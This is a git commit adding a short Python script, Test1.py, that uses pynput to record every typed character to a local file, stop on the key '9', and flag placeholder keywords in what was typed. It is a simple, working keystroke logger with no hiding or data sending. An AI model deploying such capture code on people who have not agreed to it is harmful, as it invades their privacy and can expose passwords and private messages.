a6ec8e5e9ea7915941ec08a8eca2a28ac44a0c0f
Michael <michaellammens4@hotmail.com>
2022-03-07 23:44:32 -0600

    First commit

---
+++ Test1.py
@@ -0,0 +1,34 @@
+
+from pynput import keyboard
+
+import time
+import threading
+vals = open("keystrokes.txt","w+")
+stop = "9"
+keywords = ["RedFlagWord","BadWord","triggerWord"]
+
+def store_vals():
+    vals.close()
+    vals_read = open("keystrokes.txt","r")
+    data = vals_read.readlines()
+    for i in keywords:
+        if i in data[0]:
+            print(i+" found")
+
+    print(data)
+
+
+def on_press(key):
+    try:
+        vals.write(key.char)
+        if key.char == stop:
+            store_vals()
+            listener.stop()
+    except AttributeError:
+        pass
+
+
+with keyboard.Listener(
+        on_press=on_press) as listener:
+    listener.join()
+
